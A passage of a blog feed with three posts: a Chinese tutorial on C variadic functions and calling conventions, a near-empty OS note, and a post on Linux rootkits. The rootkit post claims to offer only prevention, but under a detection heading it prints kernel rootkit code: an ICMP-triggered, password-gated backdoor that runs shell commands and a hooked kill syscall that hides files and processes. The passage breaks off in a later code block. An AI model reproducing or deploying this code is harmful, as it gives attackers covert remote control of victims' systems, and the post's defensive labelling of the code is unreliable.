class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C语言中有一种很奇怪的参数“…”，它主要用在引数（argument）个数不定的函</span><br><span class="line"></span><br><span class="line">数中，最常见的就是<span class="built_in">printf</span>函数。 </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(“Enjoy yourself everyday!\\n”); </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(“The value is %d!\\n”, value); </span><br><span class="line"></span><br><span class="line">…… </span><br><span class="line"></span><br><span class="line">你想过它是怎么实现的吗？ </span><br><span class="line"></span><br><span class="line">1\. <span class="built_in">printf</span>为什么叫<span class="built_in">printf</span>？ </span><br><span class="line"></span><br><span class="line">不管是看什么，我总是一个喜欢刨根问底的人，对事物的源有一种特殊的癖好，</span><br><span class="line"></span><br><span class="line">一段典故，一个成语，一句行话，我最喜欢的就是找到它的来历，和当时的意境，</span><br><span class="line"></span><br><span class="line">一个外文翻译过来的术语，最低要求我会尽力去找到它原本的外文术语。特别是</span><br><span class="line"></span><br><span class="line">一个字的命名来历，我一向是非常在意的，中国有句古话：“名不正，则言不顺</span><br><span class="line"></span><br><span class="line">。 ”<span class="built_in">printf</span>中的f就是format的意思，即按格式打印【注10】。 </span><br><span class="line"></span><br><span class="line">注10：其实还有很多函数，很多变量，很多命名在各种语言中都是非常讲究的，</span><br><span class="line"></span><br><span class="line">你如果细心观察追溯，一定有很多乐趣和满足，比如哈希表为什么叫hashtable</span><br><span class="line"></span><br><span class="line">而不叫hashlist？在C++的SGI STL实现中有一个专门用于递增的函数iota（不</span><br><span class="line"></span><br><span class="line">是itoa），为什么叫这个奇怪的名字，你想过吗？ </span><br><span class="line"></span><br><span class="line">看文章我不喜欢意犹未尽，己所不欲，勿施于人，所以我把这两个答案告诉你： </span><br><span class="line"></span><br><span class="line">（1）table与list做为表讲的区别： </span><br><span class="line"></span><br><span class="line">table: </span><br><span class="line"></span><br><span class="line">\-\-\-\-\-\-\-|\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-|\-\-\-\-\-\-\- </span><br><span class="line"></span><br><span class="line">item1 | kadkglasgaldfgl | jkdsfh </span><br><span class="line"></span><br><span class="line">\-\-\-\-\-\-\-|\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-|\-\-\-\-\-\-\- </span><br><span class="line"></span><br><span class="line">item2 | kjdszhahlka | xcvz </span><br><span class="line"></span><br><span class="line">\-\-\-\-\-\-\-|\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-|\-\-\-\-\-\-\- </span><br><span class="line"></span><br><span class="line">list: </span><br><span class="line"></span><br><span class="line">***\* </span><br><span class="line"></span><br><span class="line">**\* </span><br><span class="line"></span><br><span class="line">******\* </span><br><span class="line"></span><br><span class="line">****\* </span><br><span class="line"></span><br><span class="line">That<span class="string">'s the difference！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果你还是不明白，可以去看一下hash是如何实现的！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（2）The name iota is taken from the programming language APL. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">而APL语言主要是做数学计算的，在数学中有很多公式会借用希腊字母， </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">希腊字母表中有这样一个字母，大写为Ι，小写为ι， </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">它的英文拼写正好是iota，这个字母在θ(theta)和κ(kappa)之间！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">下面有一段是这样的: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">APL is renowned for using a set of non-ASCII symbols that are an extension</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> of traditional arithmetic and algebraic notation. These cryptic symbols,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> some have joked, make it possible to construct an entire air traffic </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">control system in two lines of code. Because of its condensed nature </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and non-standard characters, APL has sometimes been termed a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> "write-only language", and reading an APL program can feel like decoding</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> an alien tongue. Because of the unusual character-set, many programmers </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">used special APL keyboards in the production of APL code. Nowadays there </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">are various ways to write APL code using only ASCII characters. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在C++中有函数重载（overload）可以用来区别不同函数参数的调用，但它还是不能</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">表示任意数量的函数参数。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在标准C语言中定义了一个头文件专门用来对付可变参数列表，它包含了一组宏</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">，和一个va_list的typedef声明。一个典型实现如下【注11】： </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef char* va_list; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#define va\_start(list) list = (char*)&amp;va\_alist </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#define va_end(list) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#define va_arg(list, mode) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">((mode*) (list += sizeof(mode)))\[-1\] </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注11：你可以查看C99标准7.15节获得详细而权威的说明。也可以参考</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">《C陷阱与缺陷》的附录A。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ANSI C还提供了vprintf函数，它和对应的printf函数行为方式上完全相同，只</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不过用va_list替换了格式字符串后的参数序列。至于它是如何实现的，你在认</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">真读完《The C Programming Language》后，我相信你一定可以do it yourself！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">使用这些工具，我们就可以实现自己的可变参数函数，比如实现一个系统化的错</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">误处理函数error。它和printf函数的使用差不多。只不过将stream重新定向到</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">stderr。在这里我借鉴了《C陷阱与缺陷》的附录A的例子。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">实现如下： </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#include </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#include </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void error(char* format, …) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">va_list ap; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">va_start(ap, format); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fprintf(stderr, “error: “); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">vfprintf(stderr, format, ap); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">va_end(ap); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fprintf(stderr, “\\n”); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit(1); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">你还可以自己实现printf： </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#include </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int printf(char* format, …) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">va_list ap; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">va_start(ap, format); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int n = vprintf(format, ap); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">va_end(ap); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return n; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">我还专门找到了VC7.1的头文件看了一下，发现各个宏的具体实现还是有区别的，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">跟很多预处理（preprocessor）相关。其中va_list就不一定是char*的别名。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct &#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">char \*a0; /\* pointer to first homed integer argument */ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int offset; /* byte offset of next parameter */ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; va_list; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">其它的定义类似。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">经常在Windows进行系统编程的人一定知道函数调用有好几种不同的形式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">，比如\_\_stdcall，\_\_pascal，\_\_cdecl。在Windows下\_stdcall，__pascal</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">是一样的，所以我只说一下\_\_stdcall和\_\_cdecl的区别。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（1）__stdcall表示被调用端自身负责函数引数的压栈和出栈。函数参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">个数一定的函数都是这种调用形式。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">例如：int fun(char c, double d)，我们在main函数中使用它，这个函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">就只管本身函数体的运行，参数怎么来的，怎么去的，它一概不管。自然</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">有main负责。不过，不同的编译器的实现可能将参数从右向左压栈，也可</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">能从左向右压栈，这个顺序我们是不能加于利用的【注12】。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注12：你可以在Herb Sutter的《More Exceptional C++》中的条款20：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">An Unmanaged Pointer Problem, Part 1:Parameter Evaluation找到相</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关的细节论述。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">（2）__cdecl表示调用端负责被调用端引数的压栈和出栈。参数可变的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">函数采用的是这种调用形式。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">为什么这种函数要采用不同于前面的调用形式呢？那是因为__stdcall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">调用形式对它没有作用，被调用端根本就无法知道调用端的引数个数，它</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">怎么可能正确工作？所以这种调用方式是必须的，不过由于参数参数可变的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">函数本身不多，所以用的地方比较少。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">对于这两种方式，你可以编制一些简单的程序，然后反汇编，在汇编代码下面</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">你就可以看到实际的区别，很好理解的！ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重载函数有很多匹配（match）规则调用。参数为“…”的函数是匹配最低的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">，这一点在Andrei Alexandrescu的惊才绝艳之作《Modern C++ Design》中就</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">有用到，参看编译期间侦测可转换性和继承性”。</span></span><br></pre></td></tr></table></figure><p>参考自: <a href="http://hi.baidu.com/qq421681423/blog/item/0c7292ec533bd0d62e2e2105.html" target="_blank" rel="noopener">click here</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Something-you-don’t-know-about-C&quot;&gt;&lt;a href=&quot;#Something-you-don’t-know-about-C&quot; class=&quot;headerlink&quot; title=&quot;Something you don’t know abo
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Vita</title>
    <link href="http://yoursite.com/2018/11/22/5/"/>
    <id>http://yoursite.com/2018/11/22/5/</id>
    <published>2018-11-22T10:36:36.046Z</published>
    <updated>2018-11-22T10:19:29.251Z</updated>
    
    <content type="html"><![CDATA[<p>The OS summary!The OS summary!The OS summary!The OS summary!  </p><h1 id="The-OS-summary"><a href="#The-OS-summary" class="headerlink" title="The OS summary"></a>The OS summary</h1><hr><h3 id="This-is-a-bolg-that-can-make-you-know-more-about-OS"><a href="#This-is-a-bolg-that-can-make-you-know-more-about-OS" class="headerlink" title="This is a bolg that can make you know more about OS"></a>This is a bolg that can make you know more about OS</h3><p><code></code> bash</p><p>Too much details,so finally I give a link that I find from CSDN!<br><code>`</code> </p><p>More info: <a href="http://blog.csdn.net/basycia/article/details/52280086" target="_blank" rel="noopener">Click here</a></p><p>[</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;The OS summary!The OS summary!The OS summary!The OS summary!  &lt;/p&gt;
&lt;h1 id=&quot;The-OS-summary&quot;&gt;&lt;a href=&quot;#The-OS-summary&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>The study of how to solve rookitd record!</title>
    <link href="http://yoursite.com/2018/11/22/4/"/>
    <id>http://yoursite.com/2018/11/22/4/</id>
    <published>2018-11-22T10:36:36.042Z</published>
    <updated>2018-11-22T10:22:16.242Z</updated>
    
    <content type="html"><![CDATA[<p>First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]<br>Then define a filldir hook () function (ps: first, vfs_readir callback function (exact should be called filldir_t filler);<br>Second, sys_getdents is passed to the callback function of vfs_readdir.<br>filldir_t filler is in the various vfs_readir internal callback, by the various fs internal read_dir implementation to complete the directory traversal operation,<br>For each file or subdirectory traversed, callback filler to fill buf) hook the process callback function fill value, when the fill value is equal to the hidden<br>The process number of the stored process (ps: the process character name is converted to a corresponding integer by the kstrtouint () function).<br>prefix [MAX_PREFIX].  </p><p>Finally, in the need to hide the main function of the process in order to scan prefix [MAX_PREFIX], when the scan is not 0 when the value of the process is that we<br>Need to hide the process, return directly, do not return to the buffer. If it is 0, then we do not need to hide the process is not necessary to hide<br>Possession of the process, to the real <code>filldir</code> fill in the buffer.</p><p>Ps: Since the process is always created by the parent process, and the child process can create a child process, so the process is a tree, and rootkid through the hook function<br>Make the rootkid want to hide the process by the system call readir function callback function does not return to the process buffer, in fact, is a broken tree<br>Bad, making the real system process tree becomes incomplete</p><p>because someone will use this way to attack the others ,I only give the Prevention method to who is interested in this!!!</p><h1 id="The-first-situation"><a href="#The-first-situation" class="headerlink" title="The first situation"></a>The first situation</h1><hr><h3 id="How-to-find-hidden-process"><a href="#How-to-find-hidden-process" class="headerlink" title="How to find hidden process"></a>How to find hidden process</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/\* execute cmds hidden <span class="keyword">in</span> icmp <span class="built_in">echo</span> packet */</span><br><span class="line"></span><br><span class="line">unsigned int icmp_hook(</span><br><span class="line"></span><br><span class="line"><span class="comment">#if LINUX\_VERSION\_CODE &lt; KERNEL_VERSION(3,13,0)</span></span><br><span class="line"></span><br><span class="line">        unsigned int hooknum,</span><br><span class="line"></span><br><span class="line"><span class="comment">#else</span></span><br><span class="line"></span><br><span class="line">        const struct nf\_hook\_ops *ops,</span><br><span class="line"></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">        struct sk_buff *skb,</span><br><span class="line"></span><br><span class="line">        const struct net_device *<span class="keyword">in</span>,</span><br><span class="line"></span><br><span class="line">        const struct net_device *out,</span><br><span class="line"></span><br><span class="line">        int (\*okfn)(struct sk_buff \*))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    struct icmphdr *icmph;</span><br><span class="line"></span><br><span class="line">    struct iphdr   *iph;</span><br><span class="line"></span><br><span class="line">    char \*data, \*cmd;</span><br><span class="line"></span><br><span class="line">    int cmdlen, passlen;</span><br><span class="line"></span><br><span class="line">    icmph = icmp_hdr(skb);</span><br><span class="line"></span><br><span class="line">    data = (char *)icmph + 8;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (icmph &amp;&amp; icmph-&gt;<span class="built_in">type</span> == ICMP_ECHO &amp;&amp;</span><br><span class="line"></span><br><span class="line">            !strncmp(rce\_pass, data, passlen=strlen(rce\_pass))) &#123;</span><br><span class="line"></span><br><span class="line">        /\* get ip header */</span><br><span class="line"></span><br><span class="line">        iph = ip_hdr(skb);</span><br><span class="line"></span><br><span class="line">        /\* calculate cmd length */</span><br><span class="line"></span><br><span class="line">        cmdlen = \_\_be16\_to\_cpu(iph-&gt;tot\_len) - iph-&gt;ihl * 4</span><br><span class="line"></span><br><span class="line">            \- /\*icmp header\*/ 8 - passlen - /\*space after password\*/ 1;</span><br><span class="line"></span><br><span class="line">        FDEBUG(<span class="string">"total len: %d\\theader len: %d\\tpasslen: %d\\n"</span>,</span><br><span class="line"></span><br><span class="line">                \_\_be16\_to\_cpu(iph-&gt;tot\_len), iph-&gt;ihl, passlen);</span><br><span class="line"></span><br><span class="line">        /\* get cmd string */</span><br><span class="line"></span><br><span class="line">        cmd = rce_cmd;</span><br><span class="line"></span><br><span class="line">        memcpy(cmd, data+passlen+1, cmdlen);</span><br><span class="line"></span><br><span class="line">        cmd\[cmdlen\] = <span class="string">'\\0'</span>;</span><br><span class="line"></span><br><span class="line">        argv\[2\] = cmd;</span><br><span class="line"></span><br><span class="line">        FDEBUG(<span class="string">"Cmd (%d bytes): %s\\n"</span>, cmdlen, cmd);</span><br><span class="line"></span><br><span class="line">        /\* start userspace <span class="built_in">command</span> */</span><br><span class="line"></span><br><span class="line">        call\_usermodehelper(argv\[0\], argv, NULL, UMH\_NO_WAIT);</span><br><span class="line"></span><br><span class="line">        goto drop;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> NF_ACCEPT;</span><br><span class="line"></span><br><span class="line">drop:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> NF_DROP;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/\* netfilter hook struct */</span><br><span class="line"></span><br><span class="line">struct nf\_hook\_ops nfhook = &#123;</span><br><span class="line"></span><br><span class="line">    .owner      = THIS_MODULE,</span><br><span class="line"></span><br><span class="line">    .hook       = icmp_hook,</span><br><span class="line"></span><br><span class="line">    .pf         = PF_INET,</span><br><span class="line"></span><br><span class="line">    .hooknum    = NF\_INET\_LOCAL_IN,</span><br><span class="line"></span><br><span class="line">    .priority   = NF\_IP\_PRI_FIRST,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int rce_init(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> nf\_register\_hook(&amp;nfhook);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void rce_exit(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    nf\_unregister\_hook(&amp;nfhook);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/***********************</span><br><span class="line"></span><br><span class="line"> \* rootkit control</span><br><span class="line"></span><br><span class="line"> ***********************/</span><br><span class="line"></span><br><span class="line">/\* <span class="built_in">kill</span> hook */</span><br><span class="line"></span><br><span class="line">asmlinkage long sys\_kill(pid\_t pid, int sig)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    switch (sig) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SIGRTMAX:  /* rootkit control */</span><br><span class="line"></span><br><span class="line">            switch (pid) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> 0:</span><br><span class="line"></span><br><span class="line">                    file\_hide\_start();</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> 1:</span><br><span class="line"></span><br><span class="line">                    file\_hide\_stop();</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SIGRTMAX-1:  /* hide process */</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pid == 0)</span><br><span class="line"></span><br><span class="line">                reveal\_all\_pids();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                hide_pid(pid);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> ((asmlinkage long (*)(pid\_t, int))old\_kill)(pid, sig);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="noopener">Server</a></p><h1 id="The-second-situation"><a href="#The-second-situation" class="headerlink" title="The second situation"></a>The second situation</h1><hr><h3 id="Change-the-system’ps-and-pstree"><a href="#Change-the-system’ps-and-pstree" class="headerlink" title="Change the system’ps and pstree!"></a>Change the system’ps and pstree!</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 